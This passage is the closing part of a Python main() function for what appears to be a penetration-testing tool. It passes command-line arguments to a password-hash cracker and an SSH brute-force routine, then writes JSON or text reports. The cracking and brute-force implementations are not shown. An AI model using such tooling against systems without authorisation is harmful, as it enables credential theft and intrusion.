            hash_type, hash_value = args.password_crack.split(':')
            tool.password_cracker(hash_type, hash_value)
        
        if args.ssh_brute:
            target, username = args.ssh_brute.split(':')
            tool.ssh_bruteforce(target, username)
        
        # Generate report
        if args.report in ['json', 'both']:
            tool.generate_report('json')
        if args.report in ['txt', 'both']:
            tool.generate_report('txt')
        
        tool.print_summary()

if __name__ == "__main__":
    main()
